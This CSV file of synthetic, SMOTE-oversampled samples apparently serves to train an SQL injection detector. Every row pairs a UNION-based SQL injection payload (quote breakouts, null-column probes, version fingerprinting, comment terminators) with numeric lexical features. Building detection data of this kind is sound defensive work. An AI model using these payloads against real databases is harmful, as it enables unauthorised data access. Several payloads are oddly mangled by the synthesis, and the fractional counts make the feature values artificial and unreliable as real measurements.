id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000411,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000008,0.4869168357197656,76.51005459593378,27.204021838373514,3.8954719287154274,40.0,2.102010919186757,24.0,10.408043676747024,0.5230015945683315,0.027409473792450623,0.3138009567409989,0.13578797489821898,0.30603275756026793,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,1.0000000000000004,4.102010919186756,0.10201091918675598,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000412,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000677,0.012181600418768777,81.93824933893934,20.0,3.6557730321674566,14.0,39.95059947115148,14.0,13.98764986778787,0.1708686267429283,0.48755451109864545,0.1708686267429283,0.170708235415498,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.9876498677878685,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000454,0.3047148416294315,68.35396516073502,24.54158606429401,3.9714782243296805,38.08317212858802,9.0,15.0,6.2707930321470045,0.5568979729826289,0.13180230380459884,0.21967050634099808,0.09162921687177428,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.270793032147004,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000414,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000709,0.03723562922776905,69.80492896271615,20.0,3.5578628652982887,14.0,35.84394317017291,8.0,11.960985792543228,0.20065023679094618,0.5133568045843625,0.11465727816625496,0.17133568045843625,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.960985792543228,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000164,0.17366533607713033,69.0,19.742720302064757,3.7345090996959245,14.0,36.0,8.0,11.0,0.2028985507246377,0.5217391304347826,0.11594202898550725,0.15942028985507245,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R000590,0.026528072722730722,56.13264115014536,24.0,3.954990782581068,27.10611292011629,9.0,14.0,6.026528230029072,0.48283402004466847,0.16036482132572943,0.24945638872891246,0.10734476990068964,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0265282300290721,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000589,0.40541727787186294,60.89435750272179,21.0,3.825704406022567,14.0,22.31548600217743,14.0,10.578871500544357,0.23028981799723452,0.36573920034807206,0.23028981799723452,0.17368116365745892,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.5788715005443574,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000418,attack,union," select * from users where id  =  1 union select @||1,version  (    )   -- 1",nearest_attack_euclidean,R000041,0.9683873253968633,75.09587633388696,26.150687277685506,3.953763893265003,38.342439945459425,4.958934609911589,21.794501778515944,10.0,0.5094342824247063,0.06796830852474062,0.2893189811067315,0.1332784279438215,0.45206183305652076,0.0,2.150687277685507,0.0,0.8493127223144931,1.0,0.0,1.849312722314493,0.0,0.0,0.849312722314493,6.0,0.15068727768550694,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.8493127223144931,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.849312722314493
SMOTE_000419,attack,union,"1  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000227,0.4050579256065196,61.14250129577526,15.0,3.0902632581066634,43.71400103662021,1.0,8.0,8.428500259155053,0.7146010824706537,0.016422868755643527,0.1313829500451481,0.13759309872855466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.4285002591550535,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,union,"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",nearest_attack_euclidean,R000751,1.2235032977550688,74.0,23.88456907002194,3.9730131647239366,19.0,34.23086185995612,11.769138140043875,9.0,0.25675675675675674,0.4625792143237314,0.1590424072978902,0.12162162162162163,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.4422845350109691,0.0,0.0,4.557715464989031,4.0,0.0,0.0,1.0,0.0,0.0,1.0,0.44228453501096904,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000397,0.31996512474483557,71.6699908323039,21.0,3.712849200350623,44.33599266584312,9.0,10.0,8.33399816646078,0.6184209296799906,0.12570858714462188,0.13967620793846874,0.11619427523691875,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,5.3339981664607805,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000178,0.07082485912353081,79.62862012952438,27.96286201295244,4.164249592091765,44.7028961036195,9.0,15.0,10.925724025904875,0.5612399611537434,0.11309686050612153,0.18849476751020255,0.13716841082993247,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9257240259048753,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000423,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000629,0.2174173206913916,59.23873795874258,24.761262041257417,3.97703078598913,29.238737958742583,9.0,15.761262041257417,5.2387379587425835,0.493515459506051,0.15194536214818471,0.26621135123487255,0.08832782711089177,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.23873795874258352,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000424,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000767,0.5153159283223482,62.439046491360564,25.264542037796964,3.970206727237141,20.5872522267818,21.058168151187864,14.529084075593932,6.264542037796966,0.32869726884281436,0.33748846306329394,0.23330256816878395,0.10051169992510774,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.2645420377969665,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000425,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R000562,0.0019143270019758402,74.0,22.0,3.772356024509446,14.0,40.0,8.0,12.0,0.18918918918918917,0.5405405405405406,0.1081081081081081,0.16216216216216217,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000561,0.0736461008101014,76.38554188227256,22.07710837645451,3.799095882747378,14.0,36.30843350581805,14.0,12.077108376454513,0.18333372541393503,0.47523740069531506,0.18333372541393503,0.15809514847681483,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.077108376454513,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,union,"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",nearest_attack_euclidean,R000184,0.4061504170032343,61.937472180172534,20.61250556396549,3.8917371484905097,14.0,29.549977744138026,8.0,10.387494436034507,0.22637830499425246,0.4766024214367822,0.1293590314252871,0.16766024214367822,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.3874944360345065,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.08430669110857335,76.31559716664545,27.0,3.9142068574147926,40.0,3.0,23.315597166645446,10.0,0.5241585976305847,0.039311894822293886,0.30548985813947516,0.13103964940764617,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000429,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.11443832086516337,76.56801073907765,27.0,3.9248105523199723,40.454408591262116,3.0,23.113602147815527,10.0,0.5282349940501648,0.03919687585814935,0.3019118772311882,0.13065625286049765,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,6.886397852184471,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000430,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000164,0.108735970429728,68.42101150238462,20.0,3.7999566598013734,14.0,35.536809201907694,8.0,10.884202300476925,0.2047341120848314,0.5192217891408026,0.11699092119133221,0.15905317758303372,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.884202300476924,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,union,"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",nearest_attack_euclidean,R000710,0.16203356199668234,79.0,21.0,3.6395338941902122,14.0,44.0,8.0,13.0,0.17721518987341775,0.5569620253164557,0.10126582278481014,0.16455696202531644,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",nearest_attack_euclidean,R000583,0.23828799019807026,77.71155892835394,21.0,3.5322205339154706,14.0,42.969247142683145,8.0,12.742311785670786,0.1803007483754781,0.5527304022279158,0.10302899907170178,0.16393985032490438,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.742311785670786,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000433,attack,union,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",nearest_attack_euclidean,R000122,0.03461763041200775,81.80191953413411,27.975239941766766,4.108419567015256,24.85143965060059,32.0,15.95047988353353,9.0,0.3036865627877217,0.39128849289843576,0.19497505568615747,0.11004988862768506,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000434,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000568,0.2446363810813282,65.31076811253814,18.0,3.436151860189611,14.0,37.048614490030516,4.0,10.262153622507629,0.21459448515046783,0.567011701836635,0.061312710042990826,0.15708110296990643,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.262153622507628,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"1%""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000427,0.2569118412299773,62.67996542230077,17.0,3.2676634852064352,32.94397233784061,1.0,18.0,10.735993084460153,0.5252371306312429,0.01597458542841612,0.28754253771148996,0.171245746228851,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,3.735993084460153,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000770,0.4336031821190421,72.67805678100548,16.0,3.0555697932943113,52.14244542480438,1.0,8.0,11.535611356201096,0.7171422237304683,0.01380962937825525,0.1104770350260423,0.15857111186523415,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.535611356201095,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000437,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000707,0.19841327685290785,80.52106363163898,27.079822728060172,4.145210547599671,43.72283635103726,9.878050008661885,15.0,11.920177271939828,0.5420743837053933,0.12352797992047107,0.18636774411940993,0.14802989225472565,3.0,0.0,2.0798227280601713,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.8403545438796574,5.079822728060171,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000438,attack,union,"1'  )   where 5276  =  5276 union all select null,null--",nearest_attack_euclidean,R000635,0.01832984773180957,55.990654099949616,23.97196229984885,3.9530796438034073,26.925232799596934,9.065421300352682,14.0,6.0,0.4808653818437626,0.1619310733507155,0.25004248136386537,0.10716106344165659,1.0,0.0,2.0093459000503833,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.9906540999496172,3.0093459000503833,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000439,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000064,0.04869943952012147,76.83370588256004,25.0,3.8473803569917466,43.66741176512009,2.0831470587199785,23.083147058719977,8.0,0.5682610644297151,0.027140244459968543,0.300472223068841,0.10412646804147527,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000440,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000077,1.6858739404357614e-07,76.0,34.0,4.466308891573198,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526355,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000441,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000528,1.1664879477745342,68.78611205925876,17.33958404444407,3.3208696338948016,46.018752133332214,1.0,12.660415955555928,9.106943970370619,0.6676980631583751,0.014549902867509179,0.18483125923746574,0.13292077473664995,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5534719851853096,0.0,0.0,5.553471985185309,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000442,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000126,0.07752414737548868,75.75763752242402,20.048472495515195,3.4790185499214483,14.0,32.0,17.80611001793922,11.951527504484805,0.1848393392672468,0.4224899183251355,0.23491973424013124,0.15775100816748644,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.9515275044848046,0.0,0.0,6.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000758,0.36225872467001846,67.75495752920668,17.0,3.187288146442469,46.58498584306889,1.0,8.877478764603342,11.292492921534446,0.6887880767869152,0.014810614310565906,0.12973464223585218,0.16666666666666666,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.1462464607672236,1.0,0.0,7.146246460767223,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000444,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000149,0.18122494714213516,72.35264021996561,27.712284542206937,4.1288694966582264,29.287715457793063,19.20878249106908,15.0,8.856142271103469,0.40577411430648347,0.2643810610977591,0.20755787600610356,0.12228694858965383,3.0,0.0,0.9280711355517344,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.9280711355517348,2.9280711355517344,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
